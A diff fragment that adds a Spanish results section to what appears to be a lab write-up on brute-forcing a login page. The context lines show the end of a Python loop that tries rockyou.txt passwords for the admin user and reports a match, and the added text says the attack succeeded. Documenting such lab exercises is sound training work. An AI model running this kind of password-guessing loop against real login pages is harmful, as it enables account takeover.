@@ -65,3 +65,10 @@ with open('rockyou.txt', 'rb') as f:
         if 'Welcome' in r.text:
             print(f'LoggedIn: username: admin , password:{al}   ===found===')
             break
+```
+## ✅ Resultado
+
+El ataque fue exitoso: se encontró la combinación correcta de usuario y contraseña.
+
+Resultado obtenido en la ejecución:
+![Resultado Bruteforce](assets/3-BruteForceResultado.PNG)
